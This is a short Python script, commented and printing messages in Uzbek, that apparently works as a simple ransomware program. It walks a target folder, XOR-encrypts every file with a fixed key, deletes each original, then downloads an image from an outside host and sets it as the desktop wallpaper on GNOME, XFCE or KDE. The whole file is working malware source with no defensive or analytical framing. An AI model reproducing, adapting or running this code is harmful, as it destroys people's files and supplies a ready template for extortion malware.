import os
import urllib.request
import subprocess


def encrypt_file(file_path):
    if not os.path.exists(file_path):
        print(f"Fayl topilmadi: {file_path}")
        return

    key = 13
    with open(file_path, 'rb') as file:
        content = file.read()

    encrypted_content = bytearray()
    for byte in content:
        encrypted_content.append(byte ^ key)

    encrypted_file_path = file_path + '.encrypted'
    with open(encrypted_file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_content)

    print(f"{file_path} shifrlanib {encrypted_file_path} ga saqlandi.")
    os.remove(file_path)
    print(f"Asl fayl {file_path} o'chirildi.")


def encrypt_all_files_in_folder(folder_path):
    for root, dirs, files in os.walk(folder_path):
        for filename in files:
            file_path = os.path.join(root, filename)
            print(f"Shifrlanayotgan fayl yo'li: {file_path}")
            encrypt_file(file_path)


def download_image(image_url, save_path):
    try:
        urllib.request.urlretrieve(image_url, save_path)
        return True
    except Exception as e:
        print(f"Rasmni yuklashda xato yuz berdi: {e}")
        return False


def set_wallpaper(image_path):
    desktop_env = os.environ.get("XDG_CURRENT_DESKTOP")

    if desktop_env == "GNOME":
        result = subprocess.run(
            ["gsettings", "set", "org.gnome.desktop.background", "picture-uri", f"file://{image_path}"],
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            print("Fon rasm muvaffaqiyatli o'zgartirildi (GNOME).")
        else:
            print(f"Fon rasmni o'zgartirishda xato: {result.stderr}")

    elif desktop_env == "XFCE":
        properties = [
            "/backdrop/screen0/monitor0/workspace0/last-image",
            "/backdrop/screen0/monitor0/image-path",
            "/backdrop/screen0/monitor0/workspace0/last-image"  # qo‘shimcha xususiyat
        ]
        for prop in properties:
            result = subprocess.run(
                ["xfconf-query", "--channel", "xfce4-desktop", "--property", prop, "--set", image_path, "--create"],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                print("Fon rasm muvaffaqiyatli o'zgartirildi (XFCE).")
                return
            else:
                print(f"Xato (XFCE): {result.stderr}")
        print("Fon rasmni o'zgartirishda barcha urinishlar muvaffaqiyatsiz tugadi (XFCE).")

    elif desktop_env == "KDE":
        script = f"""
        var Desktops = desktops();
        for (i=0;i<Desktops.length;i++) {{
            d = Desktops[i];
            d.wallpaperPlugin = "org.kde.image";
            d.currentConfigGroup = Array("Wallpaper", "org.kde.image", "General");
            d.writeConfig("Image", "file://{image_path}");
        }}
        """
        result = subprocess.run(
            ["qdbus-qt5", "org.kde.plasmashell", "/PlasmaShell", "org.kde.PlasmaShell.evaluateScript", script],
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            print("Fon rasm muvaffaqiyatli o'zgartirildi (KDE).")
        else:
            print(f"Fon rasmni o'zgartirishda xato: {result.stderr}")
    else:
        print("Ushbu interfeys qo'llab-quvvatlanmaydi yoki aniqlanmagan.")


def main():
    target_folder = '/root/Desktop/yangi'

    if os.path.exists(target_folder):
        encrypt_all_files_in_folder(target_folder)
    else:
        print("Papka topilmadi.")

    image_url = 'https://i.imghippo.com/files/ZMx2558bk.png'
    image_path = os.path.join(os.path.expanduser("~"), "Desktop", "salom.png")

    if download_image(image_url, image_path):
        print("Rasm muvaffaqiyatli yuklandi.")
        set_wallpaper(image_path)
    else:
        print("Rasmni yuklashda xato yuz berdi.")


if __name__ == "__main__":
    main()
